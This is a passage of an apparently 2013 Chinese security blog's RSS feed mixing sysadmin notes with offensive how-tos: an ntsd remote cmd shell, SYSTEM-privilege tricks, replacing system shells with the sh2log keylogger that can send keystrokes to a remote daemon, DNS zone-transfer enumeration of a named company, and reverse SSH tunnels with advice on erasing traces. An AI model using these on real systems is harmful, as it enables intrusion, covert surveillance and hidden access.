&lt;p&gt;所以&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;git clone https://github.com/batistam/VMInjector
cd VMInjector
git rebase -i HEAD~2 (在编辑界面删除第2行文字!!!)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;目的是撤销最近的一次提交.这样被删掉的exe文件就回来了.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:~/VMInjector# ls
LICENSE  README  vminjector  vminjector-src
root@bt:~/VMInjector# git rebase -i HEAD~2
Successfully rebased and updated refs/heads/master.
root@bt:~/VMInjector# 
root@bt:~/VMInjector# 
root@bt:~/VMInjector# ls
LICENSE  vminjector            vminjector64-exe.rar
README   vminjector32-exe.rar  vminjector-src&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用方法命令行下执行,选择需要解锁的虚拟机然后选择操作系统版本.So easy!&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/10/08/vminjector</link>
                <guid>http://username.github.io/工具使用/2013/10/08/vminjector</guid>
                <pubDate>2013-10-08T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>使用ntsd反弹端口获取shell</title>
                <description>&lt;p&gt;ntsd功能还是非常强大的,windows也有很多花样可以玩&lt;/p&gt;

&lt;p&gt;xp测试OK.win7 ntsd找不到命令&lt;/p&gt;

&lt;p&gt;我们这次利用ntsd来实现利用系统自带的ntsd实现端口转发，本地获取shell&lt;/p&gt;

&lt;p&gt;我们的服务器端执行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ntsd -server tcp:port=7777 cmd.exe&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里的cmd.exe只是获得一个宿主进程，当然mstsc.exe 、 calc.exe等等都是可以的&lt;/p&gt;

&lt;p&gt;然后我们的电脑，也就是客户机运行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ntsd   -remote   tcp:server=服务器ip,port=7777&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;运行后会弹出一个窗口，我们输入&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;.shell&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;即可成功获得cmdshell&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/10/08/ntsdshell</link>
                <guid>http://username.github.io/技术研究/2013/10/08/ntsdshell</guid>
                <pubDate>2013-10-08T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>本地cmd获取system权限</title>
                <description>&lt;h2 id='id2613'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://hi.baidu.com/darks00n/item/22212cc397faf627ee466528&lt;/p&gt;

&lt;p&gt;win7 64位下测试:&lt;/p&gt;

&lt;p&gt;at的方式提示:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\Users\litsand&amp;gt;at 14:02 /interactive cmd
警告: 由于有安全增强功能，此任务将在预期时间运行，但不以交互方式运行。
如果要求交互式任务，则使用 schtasks.exe 实用程序(使用 &amp;quot;schtasks /?&amp;quot; 命令
获取详细信息)。
新加了一项作业，其作业 ID = 1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;创建system权限cmd失败&lt;/p&gt;

&lt;p&gt;采用创建服务的方法:&lt;/p&gt;

&lt;p&gt;可以创建一个system权限cmd,不过兼容性貌似有问题,会在新的会话中创建.&lt;/p&gt;

&lt;p&gt;xp下可以用at的方式成功创建system权限cmd&lt;/p&gt;

&lt;p&gt;psexec可以成功获取system权限,不过命令的回显貌似有问题.&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/10/08/cmdsystem</link>
                <guid>http://username.github.io/技术研究/2013/10/08/cmdsystem</guid>
                <pubDate>2013-10-08T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>zsh安装配置</title>
                <description>&lt;p&gt;参考资料&lt;/p&gt;

&lt;p&gt;http://macshuo.com/?p=676&lt;/p&gt;

&lt;p&gt;https://wiki.archlinux.org/index.php/Zsh_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29&lt;/p&gt;

&lt;h2 id='zsh'&gt;zsh安装&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;sudo apt-get install zsh
chsh -s /bin/zsh&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;安装oh-my-zsh&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;git clone git://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh
cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;或者&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2612'&gt;配置&lt;/h2&gt;

&lt;p&gt;配置主要参考mactalk的配置.其中autojump的插件,原文评论也有人提到,oh-my-zsh已经有这个插件了.为什么还要单独安装.经过测试发现,在.zshrc中开始plugins(autojump) 使用j命令会提示找不到命令.&lt;/p&gt;

&lt;p&gt;why?&lt;/p&gt;

&lt;p&gt;主要配置了一下别名.除了普通的命令别名,后缀别名,还有-g&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# command L equivalent to command |less
alias -g L=&amp;#39;|less&amp;#39; 

# command S equivalent to command &amp;amp;&amp;gt; /dev/null &amp;amp;
alias -g S=&amp;#39;&amp;amp;&amp;gt; /dev/null &amp;amp;&amp;#39;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我的配置文件&lt;/p&gt;

&lt;p&gt;https://github.com/litsand/conf/blob/master/.zshrc&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/09/29/zsh</link>
                <guid>http://username.github.io/工具使用/2013/09/29/zsh</guid>
                <pubDate>2013-09-29T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>soc类产品整理</title>
                <description>&lt;p&gt;&lt;a href='http://www.tripwire.com'&gt;tripwire&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;solarwinds&lt;/p&gt;

&lt;p&gt;splunk&lt;/p&gt;

&lt;p&gt;arcsight&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/09/29/soc</link>
                <guid>http://username.github.io/技术研究/2013/09/29/soc</guid>
                <pubDate>2013-09-29T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>linux timestamp</title>
                <description>&lt;p&gt;linux 文件的访问时间,修改时间,变更时间.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;File: `test.xml&amp;#39;
Size: 50        	Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d	Inode: 1190411     Links: 1
Access: (0664/-rw-rw-r--)  Uid: ( 1000/ litsand)   Gid: ( 1000/ litsand)
Access: 2013-09-29 16:09:29.269570245 +0800
Modify: 2013-09-29 16:06:07.944816506 +0800
Change: 2013-09-29 16:06:07.972802156 +0800&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Access: 通过vi修改文件内容,access time不变.使用cat查看文件内容.access内容改变.&lt;/p&gt;

&lt;p&gt;使用vi修改文件内容,access时间不变,modify和change时间发生改变.但是这两个时间不完全一样:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;File: `test.xml&amp;#39;
Size: 58        	Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d	Inode: 1190411     Links: 1
Access: (0664/-rw-rw-r--)  Uid: ( 1000/ litsand)   Gid: ( 1000/ litsand)
Access: 2013-09-29 16:09:29.269570245 +0800
Modify: 2013-09-29 16:11:42.633176800 +0800
Change: 2013-09-29 16:11:42.661162448 +0800&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;modify的时间要早于change&lt;/p&gt;

&lt;p&gt;使用chmod修改文件权限,change发生改变.:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;➜  /home/l  &amp;gt;chmod 777 tes*xml
➜  /home/l  &amp;gt;stat test.xml
File: `test.xml&amp;#39;
Size: 58        	Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d	Inode: 1190411     Links: 1
Access: (0777/-rwxrwxrwx)  Uid: ( 1000/ litsand)   Gid: ( 1000/ litsand)
Access: 2013-09-29 16:09:29.269570245 +0800
Modify: 2013-09-29 16:11:42.633176800 +0800
Change: 2013-09-29 16:13:35.663211109 +0800&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;所以修改文件内容,change time也会发生改变.&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/09/29/linux-timestamp</link>
                <guid>http://username.github.io/技术研究/2013/09/29/linux-timestamp</guid>
                <pubDate>2013-09-29T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>arcsight log datasheet</title>
                <description>&lt;p&gt;test&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/09/27/arcsight-log-datasheet</link>
                <guid>http://username.github.io/技术研究/2013/09/27/arcsight-log-datasheet</guid>
                <pubDate>2013-09-27T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>ubuntu搭建openvpn server</title>
                <description>&lt;p&gt;测试环境为ubuntu 10.04&lt;/p&gt;

&lt;p&gt;参考资料:&lt;/p&gt;

&lt;p&gt;&lt;a href='https://help.ubuntu.com/10.04/serverguide/openvpn.html'&gt;10.04 openvpn&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='https://help.ubuntu.com/13.04/serverguide/openvpn.html'&gt;13.04 openvpn&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://hi.baidu.com/saiafgdyshbbehq/item/07c19cae0b45db736dd45573'&gt;linux配置nat&lt;/a&gt;&lt;/p&gt;

&lt;h2 id='id2611'&gt;安装过程&lt;/h2&gt;

&lt;p&gt;参考10.04的安装 步骤完成安装.&lt;/p&gt;

&lt;p&gt;然后修改了server.conf&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;push &amp;quot;redirect-gateway def1 bypass-dhcp&amp;quot;
push &amp;quot;dhcp-option DNS 10.0.0.2&amp;quot;
push &amp;quot;dhcp-option DNS 10.1.0.2&amp;quot;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后利用iptables做好nat&lt;/p&gt;

&lt;p&gt;实验发现,连上之后过1分钟左右网络才同.&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/09/26/ubuntuopenvpn-server</link>
                <guid>http://username.github.io/工具使用/2013/09/26/ubuntuopenvpn-server</guid>
                <pubDate>2013-09-26T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>openvas配置使用</title>
                <description></description>
                <link>http://username.github.io/2013/09/26/openvas</link>
                <guid>http://username.github.io/2013/09/26/openvas</guid>
                <pubDate>2013-09-26T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>centos 5.4 X64安装hping3</title>
                <description>&lt;p&gt;参考http://blog.itechol.com/space-33-do-blog-id-5772.html&lt;/p&gt;

&lt;p&gt;整个过程还是有点曲折的&amp;#8230;&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/09/26/centos-54-x64hping3</link>
                <guid>http://username.github.io/工具使用/2013/09/26/centos-54-x64hping3</guid>
                <pubDate>2013-09-26T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>irc客户端epic使用</title>
                <description>&lt;h2 id='id2608'&gt;安装&lt;/h2&gt;

&lt;p&gt;gentoo&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge net-irc/epic4&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;启动命令 epic&lt;/p&gt;

&lt;p&gt;ubuntu&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get install epic5&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;启动命令 epic5&lt;/p&gt;

&lt;h2 id='id2609'&gt;配置和命令&lt;/h2&gt;

&lt;p&gt;配置默认server&lt;/p&gt;

&lt;h2 id='id2610'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://www.epicsol.org/doku.php &lt;a href='http://en.wikipedia.org/wiki/List_of_Internet_Relay_Chat_commands'&gt;irc命令列表&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/09/25/ircepic</link>
                <guid>http://username.github.io/工具使用/2013/09/25/ircepic</guid>
                <pubDate>2013-09-25T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>用户登录中无法删除</title>
                <description>&lt;p&gt;删除用户的时候一直提示:&lt;/p&gt;

&lt;p&gt;userdel: user postgres is currently logged in&lt;/p&gt;

&lt;p&gt;最后发现原来是因为的用户的uid是0,而root当前在线.看来系统只认识uid啊.各种条件都是利用uid来判断.&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/09/25/</link>
                <guid>http://username.github.io/技术研究/2013/09/</guid>
                <pubDate>2013-09-25T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>sh2log安装指南</title>
                <description>&lt;h2 id='id2606'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://fuzzexp.org/linuxsh2log_keylogger.html&lt;/p&gt;

&lt;p&gt;http://packetstormsecurity.com/files/51780/sh2log-1.0.tgz.html&lt;/p&gt;

&lt;h2 id='id2607'&gt;安装步骤&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;wget http://packetstormsecurity.com/files/download/51780/sh2log-1.0.tgz

tar zxvf sh2log-1.0.tgz
cd sh2log-1.0

make linux&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;报错&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost sh2log-1.0]# make linux
gcc -g -W -Wall -o sh2log  rc4.c sha1.c sh2log.c -lutil -DLINUX
gcc -g -W -Wall -o sh2logd rc4.c sha1.c sh2logd.c
gcc -g -W -Wall -o parser  rc4.c sha1.c parser.c -lX11 -L/usr/X11R6/lib
parser.c:35:22: error: X11/Xlib.h: No such file or directory&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;centos 解决办法:(centos 5.4)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;yum install libX11-devel&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ubuntu 解决方法:(ubuntu 10.04)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get install libx11-dev
用apt-cache search x11得知包的名称为libx11-dev&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;替换bash,运行sh2logd&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mkdir /bin/shells/
cp -p /bin/sh /bin/shells/
cp -p /bin/bash /bin/shells/
rm -rf /bin/sh /bin/bash
cp -p sh2log /bin/sh
cp -p sh2log /bin/bash
./sh2logd&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;会在当前目录生成以时间命令的bin文件.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost sh2log-1.0]# ls
config.h  NEWS.txt  rc4.c       sh2log                      sh2logd    sha1.h
GPL.txt   parser    rc4.h       sh2log-20130924-032100.bin  sh2logd.c  test.bin
Makefile  parser.c  README.txt  sh2log.c                    sha1.c


[root@localhost sh2log-1.0]# ./parser sh2log-20130924-032100.binSID
SOURCE IP    UID    PID    START DATE      END DATE      DURATION1
[127.0.0.1]     0 ( 3386)  24/09 03:21 | 24/09 03:22  X     1m 02s
In interactive mode, use Enter to fast forward, Space to pause and q to quit.Note that xterm is required for window resizing.
Session ID -&amp;gt; 1Interactive mode (y/n) ?
n
24/09 03:21:30 -&amp;gt; test24/09
03:21:31 -&amp;gt; 123424/09
03:21:35 -&amp;gt; hello24/09
03:21:37 -&amp;gt; ls&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以通过配置config.h 让键盘记录实时的发送到远端的sh2logd上.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ifndef _CONFIG_H
#define _CONFIG_H

#define CONNECT_IP      &amp;quot;127.0.0.1&amp;quot;
#define SERVER_PORT     40119
#define REAL_SHELL_DIR  &amp;quot;/bin/shells&amp;quot;
#define MAX_LOG_SIZE    (1048576 * 256)
#define BUFSIZE         4096

char *secret = &amp;quot;\xBA\x36\xF7\x2A\x50\x8E\x5B\xD3&amp;quot; \&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/工具使用/2013/09/24/sh2log</link>
                <guid>http://username.github.io/工具使用/2013/09/24/sh2log</guid>
                <pubDate>2013-09-24T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>emerge安装软件中断后无法继续</title>
                <description>&lt;p&gt;用emerge命令和apt-get命令安装软件，中途停止了。然后再运行命令的时候就一直卡着，软件包下载不下来。显示链接服务器超时，可是用wget是可以成功下载的。&lt;/p&gt;

&lt;p&gt;经过抓包分析，其实是花了不少时间的。发现中断之后再重新执行emerge命令发的http请求是不一样的。如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /gentoo/distfiles/acpica-unix-20090123.tar.gz HTTP/1.1
Range: bytes=386616-
User-Agent: Wget/1.14 (linux-gnu)
Accept: */*
Host: mirrors.sohu.com
Connection: Keep-Alive

GET /gentoo/distfiles/harfbuzz-0.9.12.tar.bz2 HTTP/1.1
User-Agent: Wget/1.14 (linux-gnu)
Accept: */*
Host: mirrors.163.com
Connection: Keep-Alive&lt;/code&gt;&lt;/pre&gt;

&lt;dl&gt;
&lt;dt&gt;多了一个range字段，经过搜索得知range这个字段是http 1.1协议新加的。目的是为了断点续传。可以请求一部分字段。是这个字段导致了服务器超时。解决的办法就是把emerge 或者apt-get缓存的软件包删掉。然后重新安装就可以了。&lt;/dt&gt;

&lt;dd&gt;
&lt;p&gt;!: 想到一个问题。range 这个字段可以控制请求一部分内容。那么会不会导致一些安全问题。比如本来是一段文本的js，get的时候只返回了这段js，导致js执行。会不会出现这种情况？而且配合crlf注入，注入range字段？？&lt;/p&gt;
&lt;/dd&gt;
&lt;/dl&gt;</description>
                <link>http://username.github.io/工具使用/2013/09/23/emerge</link>
                <guid>http://username.github.io/工具使用/2013/09/23/emerge</guid>
                <pubDate>2013-09-23T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>中兴交换机配置snmp服务</title>
                <description>&lt;pre&gt;&lt;code&gt;zxr5124-A(cfg)#config snmp
zxr5124-A(cfg-snmp)#creat comm
zxr5124-A(cfg-snmp)#creat community pub
zxr5124-A(cfg-snmp)#creat community public public
zxr5124-A(cfg-snmp)#creat vi
zxr5124-A(cfg-snmp)#creat view socview
zxr5124-A(cfg-snmp)#set comm
zxr5124-A(cfg-snmp)#set community pub
zxr5124-A(cfg-snmp)#set community public vie
zxr5124-A(cfg-snmp)#set community public view socview
zxr5124-A(cfg-snmp)#show snm
zxr5124-A(cfg-snmp)#show snmp&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/工具使用/2013/09/22/snmp</link>
                <guid>http://username.github.io/工具使用/2013/09/22/snmp</guid>
                <pubDate>2013-09-22T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>可加载内核模块的简单示例(翻译)</title>
                <description>&lt;h2 id='id2601'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://blog.markloiseau.com/2012/04/hello-world-loadable-kernel-module-tutorial/&lt;/p&gt;

&lt;p&gt;可加载内核模块(Loadable Kernel Module,LKM允许在不重编译内核和重启系统的条件下对类Unix系统的系统内核进行修改和扩展.大多数的Unix派生系统,包括Linux,BSD,OSX等都支持这个特性.&lt;/p&gt;

&lt;p&gt;本文着重描述编译执行一个&amp;#8221;hello world&amp;#8221;LKM的过程.相关的代码可以匆匆这里&lt;a href='http://blog.markloiseau.com/wp-content/uploads/2012/04/hello.zip'&gt;下载&lt;/a&gt;.下面的命令和代码都在Ubuntu 11.10和12.10上测试通过了.在其他的Linux发行版上也许需要做一些细微的修改.&lt;/p&gt;

&lt;h1 id='lkm'&gt;怎样打造一个LKM&lt;/h1&gt;

&lt;p&gt;1, 安装module-assistant包 2, 创建主文件hello.c和Makefile 3, 编译hello.c 4, 将编译好的模块插入到当前内核中 5, 测试完成后移除相关的内核模块&lt;/p&gt;

&lt;h2 id='id2602'&gt;安装内核头文件等准备工作&lt;/h2&gt;

&lt;p&gt;Debian和Ubuntu都提供了moddule-assistant的包,包括了编写LKM需要的所有包.可以通过一下方式安装:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo -i
apt-get install module-assistant
m-a prepare&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;module-assistant做的事情并没有多么高端.它仅仅是一个安装内核源码包的工具.下面的命令也可以安装我们编译需要的l依赖包:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo apt-get install build-essential linux-headers-$(uname -r)&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='lkmmakefile'&gt;创建LKM源码文件和Makefile&lt;/h2&gt;

&lt;p&gt;这是一个hello world的源码&amp;#8230;在本文提供的压缩包里有.作用是加载内核模块和卸载内核模块的时候输出一个hello world&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;// Defining __KERNEL__ and MODULE allows us to access kernel-level code not usually available to userspace programs.
#undef __KERNEL__
#define __KERNEL__
 
#undef MODULE
#define MODULE
 
// Linux Kernel/LKM headers: module.h is needed by all modules and kernel.h is needed for KERN_INFO.
#include &amp;lt;linux/module.h&amp;gt;    // included for all kernel modules
#include &amp;lt;linux/kernel.h&amp;gt;    // included for KERN_INFO
#include &amp;lt;linux/init.h&amp;gt;        // included for __init and __exit macros
 
static int __init hello_init(void)
{
    printk(KERN_INFO &amp;quot;Hello world!\n&amp;quot;);
    return 0;    // Non-zero return means that the module couldn&amp;#39;t be loaded.
}
 
static void __exit hello_cleanup(void)
{
    printk(KERN_INFO &amp;quot;Cleaning up module.\n&amp;quot;);
}
 
module_init(hello_init);
module_exit(hello_cleanup);
 &lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Makefile的代码:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;obj-m := hello.o
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)
 
all:
$(MAKE) -C $(KDIR) M=$(PWD) modules
 
clean:
$(MAKE) -C $(KDIR) M=$(PWD) clean&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2603'&gt;编译源码&lt;/h2&gt;

&lt;p&gt;到工作目录下执行make就可以了&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ make
make -C /lib/modules/3.0.0-17-generic/build M=/var/www/lkm modules
make[1]: Entering directory `/usr/src/linux-headers-3.0.0-17-generic&amp;#39;
CC [M] /var/www/lkm/hello.o
Building modules, stage 2.
MODPOST 1 modules
CC /var/www/lkm/hello.mod.o
LD [M] /var/www/lkm/hello.ko&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2604'&gt;加载编译好的内核模块到内核&lt;/h2&gt;

&lt;p&gt;使用insmod命令:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo insmod hello.ko&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们使用了printk()函数.会在syslog中打印.用tail /var/log/syslog查看&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ tail /var/log/syslog
&amp;lt;snip&amp;gt;
Apr 20 16:27:39 laptop kernel: [19486.347191] Hello world!&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;有一些发行版,内核信息会记录到别的文件,比如/var/log/messages.这个也要看syslog的配置.&lt;/p&gt;

&lt;h2 id='id2605'&gt;卸载模块&lt;/h2&gt;

&lt;p&gt;使用rmmod 命令&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo rmmod hello&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;查看syslog,可以看到模块卸载时候的输出:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ tail /var/log/syslog
&amp;lt;snip&amp;gt;
Apr 20 16:29:23 laptop kernel: [19486.347191] Cleaning up module.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;恭喜!你已经成功创建并使用了一个可加载内核模块.&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/09/22/</link>
                <guid>http://username.github.io/技术研究/2013/09/</guid>
                <pubDate>2013-09-22T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>kali安装vbox tools</title>
                <description>&lt;p&gt;kali 版本1.05.&lt;/p&gt;

&lt;p&gt;装vbox tools的时候编译失败,看日志是没有linux-heades.执行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get update &amp;amp;&amp;amp; apt-get install -y linux-headers-$(uname -r)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;提示找不到 3.7-trunk-pae的内核.然后差资料发现可能是源的问题.默认source.lst只有security.kali.org一个源.&lt;/p&gt;

&lt;p&gt;添加&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;deb http://http.kali.org/kali kali main contrib non-free&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;后&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get update&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;搞定.&lt;/p&gt;

&lt;h2 id='id2600' /&gt;

&lt;p&gt;https://forums.kali.org/showthread.php?5804-Kernel-headers-problem&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/09/18/kalivbox-tools</link>
                <guid>http://username.github.io/工具使用/2013/09/18/kalivbox-tools</guid>
                <pubDate>2013-09-18T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>DNS域传送漏洞</title>
                <description>&lt;h2 id='id2598'&gt;相关资料&lt;/h2&gt;

&lt;p&gt;http://drops.wooyun.org/papers/64&lt;/p&gt;

&lt;h2 id='id2599'&gt;检测方式&lt;/h2&gt;

&lt;p&gt;dig命令&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dig @194.143.123.123 gov.com axfr
dig @dnsserver-ip domain-name axfr&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;输出样例:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# dig @1.1.1.1 wooyun.org axfr  #就可以看到返回结果类似如下：  
; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.7.3 &amp;lt;&amp;lt;&amp;gt;&amp;gt; @1.1.1.1 wooyun.org axfr

; (1 server found)  
;; global options: +cmd  
wooyun.org. 86400 IN SOA wooyun.org. rname.invalid. 0 86400 3600 604800 10800  
wooyun.org. 86400 IN NS wooyun.org.  
wooyun.org. 86400 IN A 127.0.0.1  
wooyun.org. 86400 IN AAAA ::1  
test.wooyun.org. 86400 IN A 1.1.1.1  
xxx.wooyun.org. 86400 IN A 2.2.2.2  
wooyun.org. 86400 IN SOA wooyun.org. rname.invalid. 0 86400 3600 604800 10800&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;nslookup命令&lt;/p&gt;

&lt;p&gt;遇到一个问题就是linux下的nslookup,用ls的时候说没有实现这个命令&amp;#8230;..&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\Users\litsand&amp;gt;nslookup
默认服务器:  google-public-dns-a.google.com
Address:  8.8.8.8

&amp;gt; set type=NS
&amp;gt; wahaha.com.cn
服务器:  google-public-dns-a.google.com
Address:  8.8.8.8

非权威应答:
wahaha.com.cn   nameserver = sanweb.wahaha.com.cn
wahaha.com.cn   nameserver = ns.wahaha.com.cn
&amp;gt; server ns.wahaha.com.cn
默认服务器:  ns.wahaha.com.cn
Address:  60.12.5.28

&amp;gt; ls wahaha.com.cn
[ns.wahaha.com.cn]
wahaha.com.cn.                 NS     server = ns.wahaha.com.cn
wahaha.com.cn.                 NS     server = sanweb.wahaha.com.cn
2013oa                         A      192.200.8.86
aerla                          A      192.200.1.41
audit                          A      192.200.8.220
clothing                       A      202.107.206.214
clothingtest                   A      192.200.1.113
dns.itcitc.wahaha.com.cn       A      192.200.10.8
cproject                       A      192.200.1.178
cus                            A      192.200.4.21&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;http://www.wooyun.org/bugs/wooyun-2010-025344 dnsenum 工具&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dnsenum domain.com&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/技术研究/2013/09/18/dns</link>
                <guid>http://username.github.io/技术研究/2013/09/18/dns</guid>
                <pubDate>2013-09-18T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>ssh转发端口</title>
                <description>&lt;p&gt;本地转发:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ssh -fNR 11521:127.0.0.1:1521 forward@123.123.123.123&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;内网ip转发:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ssh -fNR 13389:192.168.5.10:3389 forward@123.123.123.123&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用完后记得关掉:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ps aux|grep ssh&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在进程里可以看到ssh的转发命令，把pid kill了就行。另外也可以在ssh服务器端kill，&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;netstat -anp|grep sshd&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ssh的时候会记录known_hosts，所以最后擦屁股的时候记得到开ssh的用户名的home文件夹 .ssh里面把known_hosts清掉&lt;/p&gt;

&lt;p&gt;话说insight-labs的东西真心不错.测试过都是OK的.有点小问题是ssh 本地转发的端口的时候提示host改了,可能是中间人攻击.需要忽略:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@127.0.0.1 -p 12345&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;反弹socks5代理&lt;/p&gt;

&lt;p&gt;如果用ssh自带的socks5服务器的话，需要一个能在本地登录的帐号，可以是nologin的，但是必须要能登录，如果不是root的话，socks端口只能开到&amp;gt;1024的端口。原理是先在本地开socks5，然后把本地socks5服务器的端口弹到远程服务器。&lt;/p&gt;

